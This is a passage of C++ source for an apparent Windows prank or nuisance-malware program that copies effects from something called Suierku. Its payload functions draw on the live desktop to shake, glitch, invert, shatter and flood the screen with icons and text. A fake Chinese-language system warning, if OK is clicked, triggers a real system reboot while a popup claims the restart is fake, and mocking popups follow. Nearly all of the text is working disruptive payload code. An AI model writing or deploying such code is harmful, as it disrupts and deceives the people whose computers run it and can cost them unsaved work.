        float lvl = gAudioLevel;

        // Jump amount increases over time and with audio
        int maxJump = (int)(4 + (times / 100) + lvl * 60);
        if (maxJump > th / 3) maxJump = th / 3;

        // Alternate direction: up/down based on time phase
        int dir = ((times / 20) % 2 == 0) ? 1 : -1;
        int jumpY = dir * (random() % (maxJump + 1));

        // Also add horizontal drift (right-to-left like Suierku phase 2)
        int maxDrift = (int)(2 + (times / 300) + lvl * 30);
        if (maxDrift > tw / 4) maxDrift = tw / 4;
        int driftX = -(random() % (maxDrift + 1)); // negative = leftward

        HDC desktopDC = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(desktopDC);
        HBITMAP hBmp = CreateCompatibleBitmap(desktopDC, tw, th);
        HBITMAP hOld = (HBITMAP)SelectObject(memDC, hBmp);
        BitBlt(memDC, 0, 0, tw, th, desktopDC, ox, oy, SRCCOPY);

        // Redraw shifted
        BitBlt(desktopDC, ox + driftX, oy + jumpY, tw, th, memDC, 0, 0, SRCCOPY);

        SelectObject(memDC, hOld);
        DeleteObject(hBmp);
        DeleteDC(memDC);
        ReleaseDC(NULL, desktopDC);

        int baseD4 = rampDelay(800, 60);
        int baseD5 = rampDelay(600, 6);
        int delay = (int)(baseD5 * (1.0f - lvl * 0.4f));
        if (delay < 6) delay = 6;
        return delay;
    }
    out: return rampDelay(800, 60);
}

// ── 3. Scan-line Corruption (扫描线腐蚀) ─────────────────────────────────────
// Draws animated horizontal scan-line bands that progressively corrupt the
// screen image — a key visual in Suierku's phase-2 "screen moving right-to-left
// with green stripes" effect. Each band captures a row and redraws it with
// a horizontal offset, simulating signal interference / tape corruption.
int payloadScanCorrupt(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        float lvl = gAudioLevel;

        // Number of corrupted bands grows over time
        int nBands = 4 + (times / 40) + (int)(lvl * 16);
        if (nBands > 40) nBands = 40;

        // Band height: 4-20 pixels
        int bandH = 4 + (int)(lvl * 16);
        if (bandH > 20) bandH = 20;

        // Max horizontal shift grows with time and audio
        int maxShift = (int)(8 + (times / 80) + lvl * 120);
        if (maxShift > tw / 2) maxShift = tw / 2;

        HDC desktopDC = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(desktopDC);
        HBITMAP hBmp = CreateCompatibleBitmap(desktopDC, tw, th);
        HBITMAP hOld = (HBITMAP)SelectObject(memDC, hBmp);
        BitBlt(memDC, 0, 0, tw, th, desktopDC, ox, oy, SRCCOPY);

        for (int i = 0; i < nBands; i++) {
            // Random Y position for this band
            int by = random() % (th - bandH);

            // Horizontal shift direction: mostly leftward (Suierku phase 2)
            int shift = -(random() % (maxShift + 1));
            // Occasionally shift right
            if (random() % 5 == 0) shift = random() % (maxShift / 2 + 1);

            // Copy the band shifted horizontally
            BitBlt(desktopDC, ox + shift, oy + by, tw, bandH,
                   memDC, 0, by, SRCCOPY);

            // Overlay a semi-transparent green tint on some bands
            if (random() % 3 == 0) {
                int greenAlpha = 80 + random() % 120;
                HBRUSH greenBrush = CreateSolidBrush(RGB(0, greenAlpha, 0));
                RECT bandRc = { ox + shift, oy + by,
                                ox + shift + tw, oy + by + bandH };
                // Clamp to screen
                if (bandRc.left  < ox)      bandRc.left  = ox;
                if (bandRc.right > ox + tw) bandRc.right = ox + tw;
                // Use PATINVERT for a green XOR tint
                HDC tintDC = GetDC(NULL);
                SelectObject(tintDC, greenBrush);
                PatBlt(tintDC, bandRc.left, bandRc.top,
                       bandRc.right - bandRc.left, bandH, PATINVERT);
                ReleaseDC(NULL, tintDC);
                DeleteObject(greenBrush);
            }

            // Occasionally fully blackout a thin slice (signal dropout)
            if (random() % 8 == 0) {
                HBRUSH blackBrush = CreateSolidBrush(RGB(0,0,0));
                RECT dropRc = { ox, oy + by, ox + tw, oy + by + 2 };
                HDC dropDC = GetDC(NULL);
                FillRect(dropDC, &dropRc, blackBrush);
                ReleaseDC(NULL, dropDC);
                DeleteObject(blackBrush);
            }
        }

        SelectObject(memDC, hOld);
        DeleteObject(hBmp);
        DeleteDC(memDC);
        ReleaseDC(NULL, desktopDC);

        int baseD6 = rampDelay(600, 5);
        int baseD7 = rampDelay(500, 5);
        int delay = (int)(baseD7 * (1.0f - lvl * 0.4f));
        if (delay < 5) delay = 5;
        return delay;
    }
    out: return rampDelay(600, 50);
}

// ── 4. Icon Storm (图标风暴) ───────────────────────────────────────────────────
// Draws a storm of system icons (error, warning, info, question) all over
// the screen, referencing the "满屏系统图标" effect of Suierku phase 1.
int payloadIconStorm(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        float lvl = gAudioLevel;

        // Number of icons grows rapidly
        int nIcons = 3 + (times / 20) + (int)(lvl * 15);
        if (nIcons > 40) nIcons = 40;

        // Cycle through different system icons
        HICON icons[4] = {
            LoadIcon(NULL, IDI_ERROR),
            LoadIcon(NULL, IDI_WARNING),
            LoadIcon(NULL, IDI_INFORMATION),
            LoadIcon(NULL, IDI_QUESTION)
        };

        for (int i = 0; i < nIcons; i++) {
            int ix = ox + random() % tw;
            int iy = oy + random() % th;
            DrawIcon(hdc, ix, iy, icons[random() % 4]);
        }

        // Draw cursor-following error icon (like original payloadDrawErrors)
        POINT cursor;
        GetCursorPos(&cursor);
        int lx = cursor.x - ox, ly = cursor.y - oy;
        if (lx >= 0 && lx < tw && ly >= 0 && ly < th) {
            int sz = GetSystemMetrics(SM_CXICON);
            DrawIcon(hdc, cursor.x - sz/2, cursor.y - sz/2, icons[0]);
        }

        releaseTargetDC(hdc);

        int delay = (int)(150.0 / (times / 10.0 + 1) + 5);
        delay = (int)(delay * (1.0f - lvl * 0.7f));
        if (delay < 2) delay = 2;
        return delay;
    }
    out: return rampDelay(600, 50);
}

// ── 5. Digital Glitch Blocks (数字故障块) ─────────────────────────────────────
// Draws randomly colored rectangular blocks with XOR/invert operations,
// creating the "digital corruption" / glitch aesthetic of Suierku.
int payloadGlitchBlocks(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        float lvl = gAudioLevel;

        int nBlocks = 4 + (int)(lvl * 20) + (times / 50);
        if (nBlocks > 50) nBlocks = 50;

        for (int i = 0; i < nBlocks; i++) {
            int bw = 10 + random() % 200;
            int bh = 4 + random() % 60;
            int bx = ox + random() % (tw - bw + 1);
            int by = oy + random() % (th - bh + 1);

            int mode = random() % 4;
            if (mode == 0) {
                // Solid color block
                COLORREF col = RGB(random()%256, random()%256, random()%256);
                HBRUSH brush = CreateSolidBrush(col);
                RECT rc = { bx, by, bx+bw, by+bh };
                FillRect(hdc, &rc, brush);
                DeleteObject(brush);
            } else if (mode == 1) {
                // XOR invert block
                PatBlt(hdc, bx, by, bw, bh, PATINVERT);
            } else if (mode == 2) {
                // Shift block horizontally (glitch displacement)
                int shift = (random() % 40) - 20;
                BitBlt(hdc, bx + shift, by, bw, bh, hdc, bx, by, SRCCOPY);
            } else {
                // Blackout block
                HBRUSH blackBrush = CreateSolidBrush(RGB(0,0,0));
                RECT rc = { bx, by, bx+bw, by+bh };
                FillRect(hdc, &rc, blackBrush);
                DeleteObject(blackBrush);
            }
        }

        releaseTargetDC(hdc);

        int baseD8 = rampDelay(400, 3);
        int delay = (int)(baseD8 * (1.0f - lvl * 0.4f));
        if (delay < 3) delay = 3;
        return delay;
    }
    out: return rampDelay(500, 40);
}

// ── 6. Color Invert Zones (区域彩色反转) ─────────────────────────────────────
// Inverts random rectangular regions of the screen using PATINVERT,
// creating the "color corruption" / negative-image zones seen in Suierku.
int payloadColorInvert(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        float lvl = gAudioLevel;

        // Number of inversion zones
        int nZones = 2 + (int)(lvl * 8) + (times / 100);
        if (nZones > 20) nZones = 20;

        for (int i = 0; i < nZones; i++) {
            int zw = 40 + random() % (tw / 3);
            int zh = 20 + random() % (th / 4);
            int zx = ox + random() % (tw - zw + 1);
            int zy = oy + random() % (th - zh + 1);

            // Alternate between full invert and color-tinted invert
            if (random() % 2 == 0) {
                PatBlt(hdc, zx, zy, zw, zh, PATINVERT);
            } else {
                // Draw a semi-transparent colored overlay using BitBlt tricks
                HDC memDC = CreateCompatibleDC(hdc);
                HBITMAP hBmp = CreateCompatibleBitmap(hdc, zw, zh);
                HBITMAP hOld = (HBITMAP)SelectObject(memDC, hBmp);
                // Fill with a random tint color
                COLORREF tint = HSVtoRGB((float)(random()%100)/100.0f, 0.8f, 1.0f);
                HBRUSH tintBrush = CreateSolidBrush(tint);
                RECT rc = {0, 0, zw, zh};
                FillRect(memDC, &rc, tintBrush);
                DeleteObject(tintBrush);
                // XOR blend onto screen
                BitBlt(hdc, zx, zy, zw, zh, memDC, 0, 0, SRCINVERT);
                SelectObject(memDC, hOld);
                DeleteObject(hBmp);
                DeleteDC(memDC);
            }
        }

        releaseTargetDC(hdc);

        int baseD9 = rampDelay(600, 5);
        int delay = (int)(baseD9 * (1.0f - lvl * 0.4f));
        if (delay < 5) delay = 5;
        return delay;
    }
    out: return rampDelay(800, 60);
}

// ── 7. Text / Number Rain (数字雨幕) ──────────────────────────────────────────
// Draws falling columns of random digits and characters (Matrix-style),
// rendered in green on the screen — a classic virus aesthetic.
int payloadTextRain(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        float lvl = gAudioLevel;

        // Font size
        int fontSize = 14 + (int)(lvl * 6);
        HFONT hFont = CreateFontA(fontSize, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN, "Courier New");
        HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);

        SetBkMode(hdc, TRANSPARENT);

        // Number of columns
        int colW = fontSize;
        int nCols = tw / colW + 1;
        int nRows = 2 + (int)(lvl * 4);

        for (int col = 0; col < nCols; col++) {
            // Each column has a different scroll phase
            int colPhase = (times * 3 + col * 37) % th;

            for (int row = 0; row < nRows; row++) {
                int cy = oy + (colPhase + row * (th / (nRows + 1))) % th;
                int cx = ox + col * colW;

                // Random character: digits, letters, or special chars
                char ch;
                int charType = random() % 3;
                if (charType == 0) ch = '0' + random() % 10;
                else if (charType == 1) ch = 'A' + random() % 26;
                else ch = '!' + random() % 15;

                // Color: bright green for head, darker for trail
                int brightness = 80 + (row == 0 ? 175 : random() % 100);
                SetTextColor(hdc, RGB(0, brightness, 0));

                char str[2] = { ch, 0 };
                TextOutA(hdc, cx, cy, str, 1);
            }
        }

        SelectObject(hdc, hOldFont);
        DeleteObject(hFont);
        releaseTargetDC(hdc);

        int baseD10 = rampDelay(500, 5);
        int delay = (int)(baseD10 * (1.0f - lvl * 0.4f));
        if (delay < 5) delay = 5;
        return delay;
    }
    out: return rampDelay(600, 50);
}

// ── 8. Screen Shatter (屏幕碎裂) ─────────────────────────────────────────────
// Simulates the screen "shattering" by splitting it into tiles and
// displacing/rotating them — referencing Suierku phase 3 collapse effect.
int payloadScreenShatter(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        float lvl = gAudioLevel;

        // Grid size: starts coarse, gets finer over time
        int gridW = 8 - (times / 500);
        if (gridW < 3) gridW = 3;
        int gridH = gridW;

        int tileW = tw / gridW;
        int tileH = th / gridH;
        if (tileW < 4) tileW = 4;
        if (tileH < 4) tileH = 4;

        HDC desktopDC = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(desktopDC);
        HBITMAP hBmp = CreateCompatibleBitmap(desktopDC, tw, th);
        HBITMAP hOld = (HBITMAP)SelectObject(memDC, hBmp);
        // Capture current screen
        BitBlt(memDC, 0, 0, tw, th, desktopDC, ox, oy, SRCCOPY);

        // Displace each tile
        int maxDisp = (int)(3 + (times / 200) + lvl * 40);
        if (maxDisp > tw / 4) maxDisp = tw / 4;

        for (int gy = 0; gy < gridH; gy++) {
            for (int gx = 0; gx < gridW; gx++) {
                int srcX = gx * tileW;
                int srcY = gy * tileH;

                // Displacement based on position and time
                int dx = (random() % (maxDisp*2+1)) - maxDisp;
                int dy = (random() % (maxDisp*2+1)) - maxDisp;

                int dstX = ox + srcX + dx;
                int dstY = oy + srcY + dy;

                // Clamp destination
                if (dstX < ox) dstX = ox;
                if (dstY < oy) dstY = oy;
                if (dstX + tileW > ox + tw) dstX = ox + tw - tileW;
                if (dstY + tileH > oy + th) dstY = oy + th - tileH;

                // Occasionally invert the tile color
                if (random() % 8 == 0) {
                    BitBlt(desktopDC, dstX, dstY, tileW, tileH,
                           memDC, srcX, srcY, SRCINVERT);
                } else {
                    BitBlt(desktopDC, dstX, dstY, tileW, tileH,
                           memDC, srcX, srcY, SRCCOPY);
                }
            }
        }

        SelectObject(memDC, hOld);
        DeleteObject(hBmp);
        DeleteDC(memDC);
        ReleaseDC(NULL, desktopDC);

        int baseD11 = rampDelay(300, 3);
        int delay = (int)(baseD11 * (1.0f - lvl * 0.4f));
        if (delay < 3) delay = 3;
        return delay;
    }
    out: return rampDelay(400, 30);
}

// ── 9. Reboot Warning (integrated into popup system) ────────────────────────
// Shows a real-looking "Windows will restart in 5 minutes" OK/Cancel dialog.
//   • The dialog itself roams (via msgBoxHook + roamerThread) and does NOT
//     steal focus.
//   • A separate auto-cancel thread waits 5 seconds then sends IDCANCEL to
//     the dialog, so the user never has a chance to click OK.
//   • After the dialog closes (however it closes), a roaming "fake countdown"
//     MessageBox loop runs for 30 seconds mocking the user.

// Auto-cancel thread: waits 5 s, finds the reboot-warning dialog by title,
// then posts WM_COMMAND IDCANCEL to dismiss it.
struct AutoCancelParam {
    DWORD threadId;   // thread ID of the rebootWarnThread (owns the dialog)
};

DWORD WINAPI autoCancelThread(LPVOID param) {
    AutoCancelParam *p = (AutoCancelParam*)param;
    DWORD tid = p->threadId;
    delete p;

    Sleep(5000);  // wait 5 seconds

    // Enumerate top-level windows to find the MessageBox owned by tid
    struct FindCtx { DWORD tid; HWND found; };
    FindCtx ctx = { tid, NULL };
    EnumWindows([](HWND hw, LPARAM lp) -> BOOL {
        FindCtx *c = (FindCtx*)lp;
        DWORD wTid = 0;
        GetWindowThreadProcessId(hw, NULL);
        wTid = GetWindowThreadProcessId(hw, NULL);
        // match by thread
        if (GetWindowThreadProcessId(hw, NULL) == c->tid && IsWindowVisible(hw)) {
            c->found = hw;
            return FALSE;
        }
        return TRUE;
    }, (LPARAM)&ctx);

    if (ctx.found) {
        // Post Cancel button click (IDCANCEL = 2)
        PostMessageW(ctx.found, WM_COMMAND, IDCANCEL, 0);
    }
    return 0;
}

// Roaming fake-countdown popup: shows "你被我骗了！" style messages in a loop
// for ~30 seconds (one new MessageBox every ~3 s, 10 iterations).
DWORD WINAPI fakeCdThread(LPVOID param) {
    // 10 roaming popups, 3 s apart
    // Title: 网好卡菌   Text: 哈哈！你被我骗了！不会真的重启的啦~
    const WCHAR *title = L"\x7F51\x597D\x5361\x83CC";
    const WCHAR *msgs[] = {
        // 哈哈！你被我骗了！不会真的重启的啦~
        L"\x54C8\x54C8\xFF01\x4F60\x88AB\x6211\x9A97\x4E86\xFF01\n"
        L"\x4E0D\x4F1A\x771F\x7684\x91CD\x542F\x7684\x554A~",
        // 放心，我只是想吓吓你。你的电脑还在，只是变得更卡了。
        L"\x653E\x5FC3\xFF0C\x6211\x53EA\x662F\x60F3\x5413\x5413\x4F60\x3002\n"
        L"\x4F60\x7684\x7535\x8111\x8FD8\x5728\xFF0C\x53EA\x662F\x53D8\x5F97\x66F4\x5361\x4E86\x3002",
        // 恭喜你没有点确定！你的判断力比你的电脑强多了。
        L"\x606D\x559C\x4F60\x6CA1\x6709\x70B9\x786E\x5B9A\xFF01\n"
        L"\x4F60\x7684\x5224\x65AD\x529B\x6BD4\x4F60\x7684\x7535\x8111\x5F3A\x591A\x4E86\x3002",
        // 不过……下次可不一定是假的哦？
        L"\x4E0D\x8FC7\x2026\x2026\n"
        L"\x4E0B\x6B21\x53EF\x4E0D\x4E00\x5B9A\x662F\x5047\x7684\x54E6\xFF1F",
    };
    const int nMsgs = 4;
    for (int i = 0; i < nMsgs; i++) {
        if (!enablePayloads) break;  // stop if disabled
        HHOOK hook = SetWindowsHookExW(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
        MessageBoxW(NULL, msgs[i], title, MB_OK);  // no icon = no sound
        UnhookWindowsHookEx(hook);
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI rebootWarnThread(LPVOID parameter) {
    // Title: 网好卡菌
    // Text: ⚠ 系统警告\n\nWindows 将在 5 分钟后重新启动。\n\n请立即保存您的工作…
    const WCHAR *title = L"\x7F51\x597D\x5361\x83CC";
    const WCHAR *text =
        L"\x26A0 \x7CFB\x7EDF\x8B66\x544A\n\n"
        L"Windows \x5C06\x5728 5 \x5206\x949F\x540E\x91CD\x65B0\x542F\x52A8\x3002\n\n"
        L"\x8BF7\x7ACB\x5373\x4FDD\x5B58\x60A8\x7684\x5DE5\x4F5C\xFF0C"
        L"\x5426\x5219\x6240\x6709\x672A\x4FDD\x5B58\x7684\x6570\x636E\x5C06\x4F1A\x4E22\x5931\x3002\n\n"
        L"\x539F\x56E0\xFF1A\x68C0\x6D4B\x5230\x60A8\x7684\x7535\x8111\x5DF2\x65E0\x6CD5\x6B63\x5E38\x8FD0\x884C\x3002\n"
        L"\x5EFA\x8BAE\xFF1A\x8003\x8651\x8D2D\x4E70\x4E00\x53F0\x65B0\x7535\x8111\x3002";

    // Spawn auto-cancel thread BEFORE showing the dialog
    AutoCancelParam *acp = new AutoCancelParam();
    acp->threadId = GetCurrentThreadId();
    CreateThread(NULL, 0, autoCancelThread, acp, 0, NULL);

    // Show the dialog — roams via msgBoxHook, does NOT steal focus
    HHOOK hook = SetWindowsHookExW(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    int ret = MessageBoxW(NULL, text, title, MB_OKCANCEL);  // no icon = no sound
    UnhookWindowsHookEx(hook);

    if (ret == IDOK) {
        // User clicked OK — execute real shutdown /r /t 300
        SHELLEXECUTEINFOW sei = {};
        sei.cbSize     = sizeof(sei);
        sei.fMask      = SEE_MASK_NOASYNC | SEE_MASK_FLAG_NO_UI;
        sei.lpVerb     = L"open";
        sei.lpFile     = L"shutdown";
        sei.lpParameters = L"/r /t 300";
        sei.nShow      = SW_HIDE;
        ShellExecuteExW(&sei);
        // Then mock them — they'll wonder if it's real
        // 哈哈！你被我骗了！不会真的重启的.......吗？
        const WCHAR *okTitle = L"\x7F51\x597D\x5361\x83CC";
        const WCHAR *okText  =
            L"\x54C8\x54C8\xFF01\x4F60\x88AB\x6211\x9A97\x4E86\xFF01\n"
            L"\x4E0D\x4F1A\x771F\x7684\x91CD\x542F\x7684......."
            L"\x5417\xFF1F";
        HHOOK h2 = SetWindowsHookExW(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
        MessageBoxW(NULL, okText, okTitle, MB_OK);  // no icon = no sound
        UnhookWindowsHookEx(h2);
    } else {
        // User clicked Cancel (or auto-cancelled) — show 4 troll popups
        CreateThread(NULL, 0, fakeCdThread, NULL, 0, NULL);
    }
    return 0;
}

